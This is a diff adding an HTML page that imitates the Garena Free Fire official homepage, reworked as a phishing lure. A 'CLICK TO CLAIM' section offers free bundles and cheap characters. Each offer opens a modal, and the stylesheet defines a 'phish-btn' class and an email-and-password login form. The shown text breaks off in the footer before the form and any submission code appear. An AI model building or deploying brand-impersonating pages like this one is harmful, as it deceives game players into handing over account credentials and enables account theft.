@@ -1,0 +1,969 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <!-- title -->
+    
+    <title>Garena Free Fire. Best survival Battle Royale on mobile!</title>
+    
+    
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta content="width=device-width,maximum-scale=1.0,initial-scale=1.0" name="viewport" />
+<link rel="icon" href="https://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire32-2.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="https://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire16-2.ico" type="image/x-icon" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="copyright" content="" />
+<meta content="black" name="apple-mobile-web-app-status-bar-style" />
+<meta name="apple-mobile-web-app-title" content="Garena Free Fire">
+<meta name="keywords" content="survival, last survivor, battle royale game, battle royale, battleground, last man standing, free mobile game, multipleplayer, garena mobile game," />
+<meta name="description" content="Free Fire is an multiplayer battle royale mobile game, developed and published by Garena for Android and iOS. To be the last survivor is the only goal." />
+<!-- seo: markup -->
+<script type="application/ld+json">
+{
+    "@context": "https://ff.garena.com",
+    "@type": "MobileGame",
+    "name": [{
+        "@language": "en",
+        "@value": "Garena Free Fire"
+    }],
+    "description": [{
+        "@language": "en",
+        "@value": "Garena Free Fire is a survival third-person shooter game in the form of battle royale"
+    }],
+    "genre": [
+        "Action",
+        "Third-person shooter"
+    ],
+    "url": "https://ff.garena.com",
+    "image": "https://ff.garena.com/statics/ff/images/poster.jpg",
+    "screenshot": "https://ff.garena.com/statics/ff/images/backgroundart.jpg",
+    "sameAs": [
+        "https://www.youtube.com/c/freefireru"
+    ],
+    "trailer": {
+        "@type": "VideoObject",
+        "url": "https://www.youtube.com/watch?v=CN3YgUCB3kQ",
+        "inLanguage": "en"
+    },
+    "exampleOfWork": [{
+            "@type": "MobileGame",
+            "gamePlatform": [
+                "https://en.wikipedia.org/wiki/iOS",
+                "https://en.wikipedia.org/wiki/Android"
+            ],
+            "contentRating": "PEGI 16+",
+            "releasedEvent": {
+                "@type": "PublicationEvent",
+                "startDate": "2017-12-07",
+                "location": {
+                    "@type": "Place",
+                    "name": "TH"
+                }
+            }
+        },
+        {
+            "@type": "MobileGame",
+            "gamePlatform": [
+                "https://en.wikipedia.org/wiki/iOS",
+                "https://en.wikipedia.org/wiki/Android"
+            ],
+            "contentRating": "ESRB M",
+            "releasedEvent": {
+                "@type": "PublicationEvent",
+                "startDate": "2017-12-07",
+                "location": {
+                    "@type": "Country",
+                    "name": "TH"
+                }
+            }
+        }
+    ]
+}
+</script>
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://ff.garena.com/static/common/css/reset.css">
+<link rel="stylesheet" href="https://ff.garena.com/static/common/css/common.css">
+    <!-- css -->
+    
+<link rel="stylesheet" href="https://ff.garena.com/static/css/home.css">
+
+</head>
+
+<body>
+
+<style type="text/css">
+/* The Modal (background) */
+.modal {
+  display: none; /* Hidden by default */
+  position: fixed; /* Stay in place */
+  z-index: 1; /* Sit on top */
+  padding-top: 100px; /* Location of the box */
+  left: 0;
+  top: 0;
+  width: 100%; /* Full width */
+  height: 100%; /* Full height */
+  overflow: auto; /* Enable scroll if needed */
+  background-color: rgb(0,0,0); /* Fallback color */
+  background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+}
+
+/* Modal Content */
+.modal-content {
+  background-color: #fefefe00;
+  margin: auto;
+  padding: 20px;
+  border: 0px solid #888;
+  width: 80%;
+}
+
+/* The Close Button */
+.close {
+  color: #aaaaaa;
+  float: right;
+  font-size: 28px;
+  font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+  color: #000;
+  text-decoration: none;
+  cursor: pointer;
+}
+    .phish-btn {
+        display: block;
+        width: 240px;
+        background: #ffba00;
+        font-size: 18px;
+        color: #000;
+        text-align: center;
+        line-height: 60px;
+        font-weight: bold;
+        text-transform: uppercase;
+        transition: all 0.3s ease 0s;
+    }
+    .login-form {
+    width: 300px;
+    margin: 30px auto;
+}
+.login-form h2 {
+    font-size: 26px;
+    font-weight: bold;
+    margin: 30px 0;
+    text-align: center;
+}
+.login-form form {
+    color: #fff;
+    background: #405e9e;
+    background: radial-gradient(circle, #4d6ba9, #375595);
+    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+    padding: 25px;
+    margin-bottom: 15px;
+}
+.login-form .form-control {
+    border-color: #dfdfdf;
+    box-shadow: none !important;
+}
+.login-form .form-control, .login-form .btn {
+    min-height: 38px;        
+}
+.login-form input[type="email"] {
+    border-radius: 2px 2px 0 0;
+}
+.login-form input[type="password"] {
+    border-radius: 0 0 2px 2px;
+    margin-top: -1px;
+}    
+.login-form .btn, .login-form .btn:active {        
+    font-size: 15px;
+    font-weight: bold;
+    border-radius: 2px;
+    background: #eeeeee !important;
+    color: #646464;
+    margin-bottom: 25px;
+}
+.login-form .btn:hover, .login-form .btn:focus{
+    background: #e4e4e4 !important;
+}
+.login-form a {     
+    color: #405e9e;
+}
+.login-form form a {
+    color: #fff;
+}
+.success-form {
+    background: #ffa619;
+    color: white;
+    padding: 50px;
+}
+.c-bottom-arrow {
+    width: 100%;
+    background: url(https://freefiremobile-a.akamaihd.net/ffwebsite/images/top_arrow.png) top center no-repeat;
+    height: 18px;
+    bottom: 0px;
+    position: absolute;
+    left: 0px;
+    z-index: 10;
+    offset-rotate: reverse;
+    transform: rotate(180deg);
+}
+</style>
+<div class="common-menu-wrap">
+
+    <div class="x-top-line"></div>
+
+    <!-- common menu -->
+
+    <div class="c-menu-wrap no_download">
+
+        <div class="c-menu-left"></div>
+        <ul class="c-menu">
+            
+            
+            <li class="active" >
+                <a href="https://ff.garena.com/index/en">HOME</a>
+            </li>
+            
+            
+            
+            <li >
+                <a href="https://ff.garena.com/news/index/en">NEWS</a>
+            </li>
+            
+            
+            
+            <li >
+                <a href="https://ff.garena.com/chars/index/en">CHARACTERS</a>
+            </li>
+            
+            
+            
+            <li >
+                <a href="https://ff.garena.com/map/static/en">MAP</a>
+            </li>
+            
+            
+            
+            <li >
+                <a href="https://ff.garena.com/weapons/index/en">WEAPONS</a>
+            </li>
+            
+            
+            
+            <li class="x-menu">
+                <a href="javascript:;">MEDIA<span class="menu-arrow"></span></a>
+                <div class="c-menu-nav">
+                    <div class="c-menu-nav-list">
+                        
+                        <a href="https://ff.garena.com/media/wallpaper/en">Wallpapers</a>
+                        
+                        <a href="https://ff.garena.com/media/video/en">Video</a>
+                        
+                        <a href="https://ff.garena.com/media/comic/en">Comic</a>
+                        
+                    </div>
+                </div>
+            </li>
+            
+            
+        </ul>
+
+        <div class="m-language-menu">
+            <div class="m-language-menu-box">
+                <span class="arrow"><i class="up"></i><i class="down"></i></span>
+                <span class="txt">en</span>
+            </div>
+
+            <div class="m-language-menu-change">
+                
+                <a href="https://ff.garena.com/index/en" class="active lang-en">English</a>
+                
+                <a href="https://ff.garena.com/index/pt" class="lang-pt">Português</a>
+                
+                <a href="https://ff.garena.com/index/es" class="lang-es">Español</a>
+                
+                <a href="https://ff.garena.com/index/id" class="lang-id">Indonesian</a>
+                
+                <a href="https://ff.garena.com/index/th" class="lang-th">ภาษาไทย</a>
+                
+                <a href="https://ff.garena.com/index/ru" class="lang-ru">Pусский</a>
+                
+                <a href="https://ff.garena.com/index/kr" class="lang-kr">한국어</a>
+                
+                <a href="https://ff.garena.com/index/ar" class="lang-ar">عربى</a>
+                
+                <a href="https://ff.garena.vn/" class="lang-vn">Việt Nam</a>
+                
+                <a href="https://ff.garena.tw/" class="lang-zh">中文(繁)</a>
+                
+                <a href="https://ff.garena.com/index/jp" class="lang-jp">日本語</a>
+                
+                <a href="https://ff.garena.com/index/hi" class="lang-hi">Hindi</a>
+                
+                <a href="https://ff.garena.com/index/tr" class="lang-tr">Türkçe</a>
+                
+                <a href="https://ff.garena.com/index/mm" class="lang-mm">ျမန္မာ</a>
+                
+                <a href="https://ff.garena.com/index/en-pk" class="lang-en-pk">Pakistan</a>
+                
+            </div>
+
+        </div>
+
+        <a href="https://www.facebook.com/freefireEN"
+            target="_blank" class="share-icon-fb "></a>
+        <div class="c-menu-block-right"></div>
+
+    </div>
+
+    <div class="c-menu-small">
+
+        <div class="c-menu-small-left"></div>
+
+        <div class="c-menu-small-right"><span class="one"></span><span class="two"></span><span class="three"></span>
+        </div>
+
+        <div class="c-menu-small-logo"></div>
+
+    </div>
+
+    <div class="c-menu-small-cover">
+
+        <ul class="c-menu-small-nav">
+            
+            <!-- 获取url判断是否在当前页面todo -->
+            
+            <li >
+                <a href="https://ff.garena.com/index/en">HOME</a>
+            </li>
+            
+            
+            <!-- 获取url判断是否在当前页面todo -->
+            
+            <li >
+                <a href="https://ff.garena.com/news/index/en">NEWS</a>
+            </li>
+            
+            
+            <!-- 获取url判断是否在当前页面todo -->
+            
+            <li >
+                <a href="https://ff.garena.com/chars/index/en">CHARACTERS</a>
+            </li>
+            
+            
+            <!-- 获取url判断是否在当前页面todo -->
+            
+            <li >
+                <a href="https://ff.garena.com/map/static/en">MAP</a>
+            </li>
+            
+            
+            <!-- 获取url判断是否在当前页面todo -->
+            
+            <li class="c-menu-small-nav-list">
+                <a href="javascript:;">MEDIA<span class="menu-arrow"></span></a>
+                <ul class="small-nav-box">
+                    
+                    <li><a href="https://ff.garena.com/media/wallpaper/en">Wallpapers</a></li>
+                    
+                    <li><a href="https://ff.garena.com/media/video/en">Video</a></li>
+                    
+                    <li><a href="https://ff.garena.com/media/comic/en">Comic</a></li>
+                    
+                </ul>
+            </li>
+            
+            
+            <!-- 获取url判断是否在当前页面todo -->
+            
+            <li >
+                <a href="https://ff.garena.com/weapons/index/en">WEAPONS</a>
+            </li>
+            
+            
+            <ul class="c-menu-small-download-link">
+
+                <li class="appleStore"><a href="https://app.appsflyer.com/id1300146617?pid=OrganicA&amp;c=mainpage_IOS"></a></li>
+
+                <li class="googlePlay"><a href="https://app.appsflyer.com/com.dts.freefireth?pid=OrganicA&amp;c=mainpage_AND"></a></li>
+
+            </ul>
+
+            <!--<li class="c-menu-download dn"><a href="https://play.google.com/store/apps/details?id=com.dts.freefire">DOWNLOAD</a></li>  -->
+            <a href="https://www.facebook.com/freefireEN"
+                target="_blank" class="c-menu-small-fb "></a>
+
+        </ul>
+
+    </div>
+</div>
+<!--end: common menu -->
+    <!-- content -->
+    
+<div class="wrap">
+    <div class="g-top">
+        <div class="m-video-wrap" data-m-img="https://dl.dir.freefiremobile.com/common/web_event/hash/fa431981d0f40bdb9b12bc99188021c4jpg"
+            data-pc-img="https://dl.dir.freefiremobile.com/common/web_event/hash/5c6d0368112a9763fa7373611f44dda9jpg">
+        </div>
+        <div class="m-slogan"></div>
+        <div class="m-mouse"><span></span></div>
+        <div class="c-top-arrow"></div>
+        <div class="c-teeth"></div>
+        <div class="index-download-btn appleStore"><a href="https://app.appsflyer.com/id1300146617?pid=OrganicA&amp;c=mainpage_IOS"><img
+                    src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/download/appstore2.png"></a></div>
+        <div class="index-download-btn googlePlay"><a href="https://app.appsflyer.com/com.dts.freefireth?pid=OrganicA&amp;c=mainpage_AND"><img
+                    src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/download/googlePlay2.png"></a></div>
+        <div class="m-language-index">
+            <span class="earth"></span>
+            <span class="txt">English</span>
+            <span class="arrow"><i class="up"></i><i class="down"></i></span>
+            <div class="m-language-index-change">
+                
+                <a href="https://ff.garena.com/index/en" class="active lang-en">English</a>
+                
+                <a href="https://ff.garena.com/index/pt" class="lang-pt">Português</a>
+                
+                <a href="https://ff.garena.com/index/es" class="lang-es">Español</a>
+                
+                <a href="https://ff.garena.com/index/id" class="lang-id">Indonesian</a>
+                
+                <a href="https://ff.garena.com/index/th" class="lang-th">ภาษาไทย</a>
+                
+                <a href="https://ff.garena.com/index/ru" class="lang-ru">Pусский</a>
+                
+                <a href="https://ff.garena.com/index/kr" class="lang-kr">한국어</a>
+                
+                <a href="https://ff.garena.com/index/ar" class="lang-ar">عربى</a>
+                
+                <a href="https://ff.garena.vn/" class="lang-vn">Việt Nam</a>
+                
+                <a href="https://ff.garena.tw/" class="lang-zh">中文(繁)</a>
+                
+                <a href="https://ff.garena.com/index/jp" class="lang-jp">日本語</a>
+                
+                <a href="https://ff.garena.com/index/hi" class="lang-hi">Hindi</a>
+                
+                <a href="https://ff.garena.com/index/tr" class="lang-tr">Türkçe</a>
+                
+                <a href="https://ff.garena.com/index/mm" class="lang-mm">ျမန္မာ</a>
+                
+                <a href="https://ff.garena.com/index/en-pk" class="lang-en-pk">Pakistan</a>
+                
+            </div>
+        </div>
+    </div>
+    <div class="g-cont">
+        <h2 class="c-h2">CLICK TO CLAIM</h2>
+        <div class="c-bottom-arrow"></div>
+        <ul class="c-news-list c-news-list-3x">
+            
+<li>
+    <a href="javascript:;" onclick="openModal()">
+        <div class="c-news-img">
+            <img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/pop/052.jpg" alt="BUNNY WARRIOR BUNDLE">
+        </div>
+        <div class="c-news-txt">
+            <object>
+                <a href="javascript:;" onclick="openModal()" class="title">BUNNY WARRIOR BUNDLE</a>
+                <span>BUNNY WARRIOR BUNDLE</span>
+                <b class="time">2021-08-21</b>
+                <!-- <button>download</button> -->
+            </object>
+        </div>
+
+
+    </a>
+</li>
+
+<li>
+    <a href="javascript:;" onclick="openModal()">
+        <div class="c-news-img">
+            <img src="https://preview.redd.it/1mvpmojpx5861.png?width=1280&format=png&auto=webp&s=c09f0c30c51a1bfe52b224ea471faedf04a3c43c" alt="PATCH NOTE: RAMPAGE">
+        </div>
+        <div class="c-news-txt">
+            <object>
+                <a href="javascript:;" onclick="openModal()" class="title">WINTERLANDS M1887</a>
+                <span>WINTERLANDS M1887</span>
+                <b class="time">2021-06-08</b>
+                <!-- <button>download</button> -->
+            </object>
+        </div>
+    </a>
+</li>
+
+<li>
+    <a href="javascript:;" onclick="openModal()">
+        <div class="c-news-img">
+            <img src="https://i.ytimg.com/vi/3U2ZkQTHang/maxresdefault.jpg" alt="Garena Free Fire’s Rampage campaign back for its 3rd edition,  headlined by theme song by DJ-duo Dimitri Vegas &amp; Like Mike" onclick="openModal()">
+        </div>
+        <div class="c-news-txt">
+            <object>
+                <a href="javascript:;" class="title">THOMPSON DRAGON MOB</a>
+                <span>THOMPSON DRAGON MOB</span>
+                <b class="time">2021-06-04</b>
+                <!-- <button>download</button> -->
+            </object>
+        </div>
+    </a>
+</li>
+
+        </ul>
+        <div class="c-more-box"><a href="https://ff.garena.com/news/index/en/" class="c-more m-index-more">LOAD MORE</a>
+        </div>
+        <!-- Game Story -->
+<div class="g-videoshow" style="background-image: url(https://dl.dir.freefiremobile.com/common/web_event/officialwebsite/home/homevideo.jpg); ">
+  <div class="m-videoshow-bg">
+    <video id="J_video_show" class="bg-video">
+      <source src="https://dl.dir.freefiremobile.com/common/web_event/officialwebsite/home/MP42.mp4" type="video/webm">
+      <source src="https://dl.dir.freefiremobile.com/common/web_event/officialwebsite/home/MP42.mp4" type="video/mp4">
+    </video>
+  </div>
+  <div class="m-videoshow-video J_videoshow_cont">
+    <div class="m-videoshow-video-wrap">
+      <div class="m-videoshow-main">
+        <iframe width="100%" height="100%" src="https://www.youtube.com/embed/HzW_K3V3Iv4" frameborder="0" gesture="media"
+          allow="encrypted-media" allowfullscreen="allowfullscreen"></iframe>
+      </div>
+    </div>
+  </div>
+  <div class="txt J_videoshow_cont"><p>Free Fire is a battle royale shooting game. Each game places 50 players on a single island, where they can explore the vast map, hide in the wild, or seek to eliminate enemy players in order to be the last person surviving on the island.</p>
+
+<p>Aside from battle royale, other game modes are also available in Free Fire. Clash Squad mode is one such game mode that has risen in popularity. The game mode places 2 teams of 4 players in a small location, where they engage in multiple rounds of combat to determine the more skillful team. Other modes include the more casual Pet Rumble, a social game where players engage in a battle of wits.</p></div>
+</div>
+
+<h2 class="c-h2" style="padding-top: 30px;">VIDEO</h2>
+<div class="g-gameVideo-wrap">
+  <ul class="m-gameVideo">
+    
+<li class="video-model" data-video="https://www.youtube.com/embed/yrIb0Ie0FgQ">
+    <div class="m-video-box">
+        <div class="img">
+            <img src="https://dl.dir.freefiremobile.com/common/web_event/hash/414e47f0d1372b4e264ce483a43c59ddjpg">
+        </div>
+        <div class="play"></div>
+        <div class="txt">The Kelly Show: 4nniversary</div>
+    </div>
+</li>
+
+<li class="video-model" data-video="https://www.youtube.com/embed/gj1-4qUKOQ0">
+    <div class="m-video-box">
+        <div class="img">
+            <img src="https://dl.dir.freefiremobile.com/common/web_event/hash/53531bfd87db328e63a2e9efd095efb0jpg">
+        </div>
+        <div class="play"></div>
+        <div class="txt">EP39 -  Wildland Walkers</div>
+    </div>
+</li>
+
+<li class="video-model" data-video="https://www.youtube.com/embed/2VuCjxOWHls">
+    <div class="m-video-box">
+        <div class="img">
+            <img src="https://dl.dir.freefiremobile.com/common/web_event/hash/be492b68890a3e33411d76947d3ac20cjpg">
+        </div>
+        <div class="play"></div>
+        <div class="txt">Free Fire x McLaren - Drift To Booyah! | P1™ CG Animation</div>
+    </div>
+</li>
+
+    <!-- more -->
+    <div class="c-more-box">
+      <a href="https://ff.garena.com/media/video/en/" class="c-more m-index-more">LOAD MORE</a>
+    </div>
+  </ul>
+</div>
+<!-- </div> -->
+
+<!-- swiper module -->
+<div class="swiper2_wrap">
+  <ul class="swiper2_list">
+    
+    <li class="new active">
+      <div class="swiper2_show">
+        <img class="pc_img" src="https://dl.dir.freefiremobile.com/common/web_event/hash/bd89e74b8261cdd2fefd6c9606a0cea6jpg">
+        <img class="mobile_img" src="https://dl.dir.freefiremobile.com/common/web_event/hash/29db3c0213840b6afe6153cf26658a7cjpg">
+      </div>
+      <div class="swiper2_cont">
+        <h3>
+          Thiva
+          <span class="icon"><img src="https://dl.dir.freefiremobile.com/common/web_event/hash/d9dcb6f1e1e1209236b59a7b03b2e893png"></span>
+        </h3>
+        <p>Thiva is the lead singer and musician in a band.<br>Rescue (help-up) speed increases.</p>
+        <a href="javascript:;" onclick="openModal()">$ 8</a>
+      </div>
+    </li>
+    
+    <li class="">
+      <div class="swiper2_show">
+        <img class="pc_img" src="https://dl.dir.freefiremobile.com/common/web_event/hash/cf61965ae7989bd2ef27f4f7f80ca908jpg">
+        <img class="mobile_img" src="https://dl.dir.freefiremobile.com/common/web_event/hash/220a515ec825a5e9652c60fb28a704acjpg">
+      </div>
+      <div class="swiper2_cont">
+        <h3>
+          Dimitri
+          <span class="icon"><img src="https://dl.dir.freefiremobile.com/common/web_event/hash/4625f2ca45b04280915abca92b530a6fpng"></span>
+        </h3>
+        <p>Dimitri is the sound technology engineer and musician.<br>Creates a 3.5m healing zone. Inside, users and allies recover 3HP/s. When downed, users and allies can self-recover to get up.</p>
+        <a href="javascript:;" onclick="openModal()">$ 7</a>
+      </div>
+    </li>
+    
+    <li class="">
+      <div class="swiper2_show">
+        <img class="pc_img" src="https://dl.dir.freefiremobile.com/common/web_event/hash/3cf2a5dab2b9f62c4eb3c529b4c253e2jpg">
+        <img class="mobile_img" src="https://dl.dir.freefiremobile.com/common/web_event/hash/f7e6443d6e5a7559a582a1500cb37869jpg">
+      </div>
+      <div class="swiper2_cont">
+        <h3>
+          D-bee
+          <span class="icon"><img src="https://dl.dir.freefiremobile.com/common/web_event/hash/2d9d8ac9b420dff35e2a8647937440bbpng"></span>
+        </h3>
+        <p>D-bee is a music creator and street dancer<br>When firing while moving, movement speed and accuracy increase.</p>
+        <a href="javascript:;" onclick="openModal()">FREE</a>
+      </div>
+    </li>
+    
+    <li class="">
+      <div class="swiper2_show">
+        <img class="pc_img" src="https://dl.dir.freefiremobile.com/common/web_event/hash/64ec871848d999ce58abc9a3f13fb7ebjpg">
+        <img class="mobile_img" src="https://dl.dir.freefiremobile.com/common/web_event/hash/9af8a73450d96e44d30e759c8601dd58jpg">
+      </div>
+      <div class="swiper2_cont">
+        <h3>
+          Maro
+          <span class="icon"><img src="https://dl.dir.freefiremobile.com/common/web_event/hash/3daa2b91d43c99abaef09e362c75a82apng"></span>
+        </h3>
+        <p>Maro is a falconer<br>Damage increases with distance. Damage to marked enemies increases.</p>
+        <a href="javascript:;" onclick="openModal()">$ 8</a>
+      </div>
+    </li>
+    
+    <li class="">
+      <div class="swiper2_show">
+        <img class="pc_img" src="https://dl.dir.freefiremobile.com/common/web_event/hash/24bbd8e6eba4b0d041c8283606aa3360jpg">
+        <img class="mobile_img" src="https://dl.dir.freefiremobile.com/common/web_event/hash/b15a007810996246e7b01a0d81b959aajpg">
+      </div>
+      <div class="swiper2_cont">
+        <h3>
+          Xayne
+          <span class="icon"><img src="https://dl.dir.freefiremobile.com/common/web_event/hash/316bbe1a2cf1b59eda42203e9bf50ff3png"></span>
+        </h3>
+        <p>Xayne is a free spirited extreme athlete<br>Gets 80 HP temporarily, increased damage to Gloo Walls and shields. Lasts for 10s.</p>
+        <a href="javascript:;" onclick="openModal()">$ 9</a>
+      </div>
+    </li>
+    
+    <li class="">
+      <div class="swiper2_show">
+        <img class="pc_img" src="https://dl.dir.freefiremobile.com/common/web_event/hash/e56082fef248993e8dc5eafe554e05f8jpg">
+        <img class="mobile_img" src="https://dl.dir.freefiremobile.com/common/web_event/hash/3bd876b4e03c03d272d2892fc6cad85cjpg">
+      </div>
+      <div class="swiper2_cont">
+        <h3>
+          Skyler
+          <span class="icon"><img src="https://dl.dir.freefiremobile.com/common/web_event/hash/5d12fdec46e60538f94d26e8f2312c94png"></span>
+        </h3>
+        <p>Skyler is an entertainment company CEO & Superstar<br>Unleash a sonic wave forward that damages Gloo Walls. Also, each Gloo Wall deployed will result in HP recovery. Recovery effects do not stack.</p>
+        <a href="javascript:;" onclick="openModal()">$ 6</a>
+      </div>
+    </li>
+    
+    <li class="">
+      <div class="swiper2_show">
+        <img class="pc_img" src="https://freefiremobile-a.akamaihd.net/common/web_event/officialwebsite/character/Shirou/char_Shirou.jpg">
+        <img class="mobile_img" src="https://freefiremobile-a.akamaihd.net/common/web_event/officialwebsite/character/Shirou/mobile_bg.jpg">
+      </div>
+      <div class="swiper2_cont">
+        <h3>
+          Shirou
+          <span class="icon"><img src="https://freefiremobile-a.akamaihd.net/common/web_event/officialwebsite/character/Shirou/Shirou_skill.png"></span>
+        </h3>
+        <p>Shirou is an app-delivery boy.<br>When user is hit from within 80m, the attacker is marked (only visible to user). First shot on marked enemies has additional armor penetration.</p>
+        <a href="javascript:;" onclick="openModal()">$ 4</a>
+      </div>
+    </li>
+    
+    <li class="">
+      <div class="swiper2_show">
+        <img class="pc_img" src="https://freefiremobile-a.akamaihd.net/common/web_event/officialwebsite/character/Chrono/home_pc.jpg">
+        <img class="mobile_img" src="https://freefiremobile-a.akamaihd.net/common/web_event/officialwebsite/character/Chrono/mobile_bg.jpg">
+      </div>
+      <div class="swiper2_cont">
+        <h3>
+          Chrono
+          <span class="icon"><img src="https://freefiremobile-a.akamaihd.net/common/web_event/officialwebsite/character/Chrono/skill.png"></span>
+        </h3>
+        <p>Chrono is a bounty hunter from another universe.<br>Creates a force field that blocks damages from enemies. One can fire from inside the force field.  Within the force field, you can increase in movement speed during activation.</p>
+        <a href="javascript:;" onclick="openModal()">$ 10</a>
+      </div>
+    </li>
+    
+    <li class="">
+      <div class="swiper2_show">
+        <img class="pc_img" src="https://freefiremobile-a.akamaihd.net/common/web_event/officialwebsite/character/Dasha/char_Dasha.jpg">
+        <img class="mobile_img" src="https://freefiremobile-a.akamaihd.net/common/web_event/officialwebsite/character/Dasha/Dasha_mobile_bg.jpg">
+      </div>
+      <div class="swiper2_cont">
+        <h3>
+          Dasha
+          <span class="icon"><img src="https://freefiremobile-a.akamaihd.net/common/web_event/officialwebsite/character/Dasha/Dasha_skill.png"></span>
+        </h3>
+        <p>Dasha is a prankster and rebel.<br>Reduce damage taken and recovery time from falls. Reduce rate of recoil buildup and maximum recoil.</p>
+        <a href="javascript:;" onclick="openModal()">$ 8</a>
+      </div>
+    </li>
+    
+    <li class="">
+      <div class="swiper2_show">
+        <img class="pc_img" src="https://freefiremobile-a.akamaihd.net/common/web_event/officialwebsite/character/Kshmr/charK.jpg">
+        <img class="mobile_img" src="https://freefiremobile-a.akamaihd.net/common/web_event/officialwebsite/character/Kshmr/Kmobile_bg.jpg">
+      </div>
+      <div class="swiper2_cont">
+        <h3>
+          K
+          <span class="icon"><img src="https://freefiremobile-a.akamaihd.net/common/web_event/officialwebsite/character/Kshmr/K_skill.png"></span>
+        </h3>
+        <p>K is a professor and jiujitsu expert.<br>Max EP increases by 50. Jiujitsu Mode: Allies within 6m get 500% increase in EP conversion rate. Psychology Mode: Recover 2 EP every {4}s, up to {6} EP. Mode switch CD 20s.</p>
+        <a href="javascript:;" onclick="openModal()">$ 8</a>
+      </div>
+    </li>
+    
+  </ul>
+  <ul class="swiper2_icon">
+    
+    <li class="new active"><a href="javascript:;"><img
+          src="https://dl.dir.freefiremobile.com/common/web_event/hash/a6584e5fe8cdfd26ae8c912653b50762jpg"></a></li>
+    
+    <li class=""><a href="javascript:;"><img
+          src="https://dl.dir.freefiremobile.com/common/web_event/hash/43720ee8db28da36be79aaa0f658d663jpg"></a></li>
+    
+    <li class=""><a href="javascript:;"><img
+          src="https://dl.dir.freefiremobile.com/common/web_event/hash/36e222edf6af23cfb13ca65ef5adfa0bjpg"></a></li>
+    
+    <li class=""><a href="javascript:;"><img
+          src="https://dl.dir.freefiremobile.com/common/web_event/hash/14bd1bdb171a284cb28785939cb1cb45jpg"></a></li>
+    
+    <li class=""><a href="javascript:;"><img
+          src="https://dl.dir.freefiremobile.com/common/web_event/hash/4380395b309f19b6b6b2da186126f3e4jpg"></a></li>
+    
+    <li class=""><a href="javascript:;"><img
+          src="https://dl.dir.freefiremobile.com/common/web_event/hash/2a9368ca09c6584e1068e3b3810e4c54jpg"></a></li>
+    
+    <li class=""><a href="javascript:;"><img
+          src="https://freefiremobile-a.akamaihd.net/common/web_event/officialwebsite/character/Shirou/Shirou.jpg"></a></li>
+    
+    <li class=""><a href="javascript:;"><img
+          src="https://freefiremobile-a.akamaihd.net/common/web_event/officialwebsite/character/Chrono/head.jpg"></a></li>
+    
+    <li class=""><a href="javascript:;"><img
+          src="https://freefiremobile-a.akamaihd.net/common/web_event/officialwebsite/character/Dasha/Dasha_icon.jpg"></a></li>
+    
+    <li class=""><a href="javascript:;"><img
+          src="https://freefiremobile-a.akamaihd.net/common/web_event/officialwebsite/character/Kshmr/Khead.jpg"></a></li>
+    
+  </ul>
+</div>
+    </div>
+</div>
+<!-- fixed download -->
+<div class="c-fixed-download-wrap" id="J_fixed_download">
+    <div class="c-fixed-download clearFix">
+        <a href="javascript:;" class="c-fixed-download-logo">
+            <img src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png" class="app-icon">
+            <img src="https://freefiremobile-a.akamaihd.net/common/web_event/official/logo-small-fixed_20210113.png" class="logo-small-fixed">
+        </a>
+        <div class="c-fixed-download-list clearFix">
+            <a href="https://app.appsflyer.com/id1300146617?pid=OrganicA&amp;c=mainpage_IOS"><img src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/download/appstore3.png"></a>
+            <a href="https://app.appsflyer.com/com.dts.freefireth?pid=OrganicA&amp;c=mainpage_AND"><img src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/download/googleplay3.png"></a>
+        </div>
+        <div class="c-fixed-download-btn">
+            <a href="https://app.appsflyer.com/id1300146617?pid=OrganicA&amp;c=mainpage_IOS" class="c-fixed-download-ios dn">download</a>
+            <a href="https://app.appsflyer.com/com.dts.freefireth?pid=OrganicA&amp;c=mainpage_AND" class="c-fixed-download-pc dn">download</a>
+        </div>
+    </div>
+    <div class="c-fixed-download-close"></div>
+</div>
+<!--end: download -->
+
+    <!-- footer -->
+    
+<!-- common footer -->
+
+<div class="g-footer clearFix">
+
+    <div class="m-foot-wrap">
+
+        <div class="m-language">
+
+            <span class="earth"></span>
+
+            <span class="txt">English</span>
+
+            <span class="arrow"><i class="up"></i><i class="down"></i></span>
+
+            <div class="m-language-change">
+                
+                    <a href="https://ff.garena.com/index/en" class="active lang-en">English</a>
+                
+                    <a href="https://ff.garena.com/index/pt" class="lang-pt">Português</a>
+                
+                    <a href="https://ff.garena.com/index/es" class="lang-es">Español</a>
+                
+                    <a href="https://ff.garena.com/index/id" class="lang-id">Indonesian</a>
+                
+                    <a href="https://ff.garena.com/index/th" class="lang-th">ภาษาไทย</a>
+                
+                    <a href="https://ff.garena.com/index/ru" class="lang-ru">Pусский</a>
+                
+                    <a href="https://ff.garena.com/index/kr" class="lang-kr">한국어</a>
+                
+                    <a href="https://ff.garena.com/index/ar" class="lang-ar">عربى</a>
+                
+                    <a href="https://ff.garena.vn/" class="lang-vn">Việt Nam</a>
+                
+                    <a href="https://ff.garena.tw/" class="lang-zh">中文(繁)</a>
+                
+                    <a href="https://ff.garena.com/index/jp" class="lang-jp">日本語</a>
+                
+                    <a href="https://ff.garena.com/index/hi" class="lang-hi">Hindi</a>
+                
+                    <a href="https://ff.garena.com/index/tr" class="lang-tr">Türkçe</a>
+                
+                    <a href="https://ff.garena.com/index/mm" class="lang-mm">ျမန္မာ</a>
+                
+                    <a href="https://ff.garena.com/index/en-pk" class="lang-en-pk">Pakistan</a>
+                
+            </div>
+        </div>
+
+        <div class="m-foot-copyright">
+
+            <div class="m-foot-logo"><img src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/logo_small_foot.png"></div>
+
+            <div class="txt">Copyright © Garena International.<br>Trademarks belong to their respective owners. All rights Reserved.</div>
+
+        </div>
+        <div class="m-foot-link">
